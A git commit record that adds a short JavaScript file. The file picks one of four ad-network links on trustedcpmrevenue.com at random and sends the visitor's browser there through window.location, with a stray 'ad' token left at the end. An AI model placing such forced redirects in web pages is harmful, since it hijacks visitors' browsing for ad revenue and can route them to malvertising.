d8dabf5485fe5cb64fe4c9a106baf75263bd0c16
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2022-01-19 09:06:06 +0800

    Create amat1.js

---
+++ amat1.js
@@ -0,0 +1,16 @@
+var dataUrl = [
+  
+  'https://www.trustedcpmrevenue.com/tiiae97v?key=a7b4d96df0730d539d59907332df677c',
+  'https://www.trustedcpmrevenue.com/bzp6w4f9?key=1c51dd0fff2207ac667bc42f8b0de48b',
+  'https://www.trustedcpmrevenue.com/vvbprkvhh?key=6bc5aca654bd28d125151eb699977a3f',
+  'https://www.trustedcpmrevenue.com/q2jmcuid?key=efefb2c32cebbff68b8da2bfee4449ea'
+
+ 
+  
+  
+  
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
+ad
